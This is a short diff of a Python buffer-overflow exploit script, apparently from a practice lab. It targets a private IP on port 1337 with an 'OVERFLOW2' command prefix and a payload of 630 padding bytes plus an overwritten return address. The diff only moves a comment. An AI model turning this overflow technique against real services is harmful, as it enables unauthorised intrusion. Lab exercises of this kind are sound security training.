@@ -1,5 +1,3 @@
-#62501205
-
 #!/usr/bin/python3
 
 import sys, socket
@@ -8,7 +6,7 @@ from time import sleep
 ip = '10.10.103.180'
 port = 1337
 prefix = 'OVERFLOW2 /.:/'
-
+#62501205
 shellcode = 'A' * 630 + '\x05\x12\x50\x62'
 
 try:
